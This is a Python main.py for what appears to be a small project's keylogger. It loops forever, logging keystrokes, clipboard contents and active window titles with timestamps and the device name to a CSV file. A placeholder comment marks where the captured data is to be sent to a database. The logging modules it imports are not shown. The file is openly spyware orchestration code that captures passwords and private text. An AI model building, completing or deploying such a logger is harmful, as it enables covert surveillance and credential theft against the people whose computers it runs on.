########################################################################################################################
#               This is the main.py for this project where the core of the project's code should be.                   #
#               Try to keep the code as modular as possible by separating it into functions and classes.               #
#                                                                                                                      #
#               - Keano (03-04-2023)                                                                                   #
########################################################################################################################

# Library imports here
import window_info_logger as wilogger
import keystrokes_and_clipboard_logger as kclogger
import os
import socket
from datetime import datetime
import time
import csv


def check_if_time_passed(old_time, time_passed):
    if time.time() - old_time >= time_passed:
        return True


def time_to_datetime(time_since_epoch):
    current_time = datetime.fromtimestamp(time_since_epoch)
    current_time_hour_minute_seconds = current_time.strftime('%H:%M:%S')
    return current_time_hour_minute_seconds


def initialise_log_file(csv_file):
    device_name = socket.gethostname()
    csv_file.writerow([f"Device name: {device_name}"])
    csv_file.writerow([f"Date & time: {datetime.now()}"])
    csv_file.writerow(["======================================================"])

    # Vaststellen kolommen
    # vóór versturen naar DB moet device_nam
    csv_file.writerow(["datetime", "window_title", "data_ID", "logged_data"])


# Main code here
def main():
    if os.path.isfile("logged_data.csv"):
        # Add code for sending data to database here.
        os.remove("logged_data.csv")
    old_date_and_time = time.time()
    note_interval_seconds = 60

    with open('logged_data.csv', 'a+', newline='') as f, open('text_file.txt', 'w+') as txt_file:
        csvreader = csv.writer(f)
        initialise_log_file(csvreader)  # Note user info and starting date + time of keylogger.
        kc_logger_object = kclogger.KeysClipboardLogger(csvreader, txt_file)  # Start keylogger.
        window_logger_object = wilogger.WindowLogger(csvreader)  # Start window logger.
        while True:
            # if window change or time has passed
            if window_logger_object.screen_changed() or check_if_time_passed(old_date_and_time, note_interval_seconds):
                window_title = window_logger_object.log_window()

                logged_keys = kc_logger_object.get_current_logged_keys()
                data_id = 0
                # save currently logged data to csv with old time + old app & window data + data ID = 0
                csvreader.writerow(
                    [f"{time_to_datetime(old_date_and_time)}", f"{window_title}", f"{data_id}", f"{logged_keys}"])
                old_date_and_time = time.time()

            # if clipboard changed
            if kc_logger_object.clipboard_changed():
                clipboard_date_and_time, data = kc_logger_object.log_clipboard()
                window_title = window_logger_object.log_window()
                data_id = 1
                csvreader.writerow(
                    [f"{time_to_datetime(clipboard_date_and_time)}", f"{window_title}", f"{data_id}", f"{data}"])
                # save currently logged data to csv with old time + old / current app & window data
                # save clipboard data to csv with new time + old / current app & window data + data ID = 1


if __name__ == '__main__':
    main()
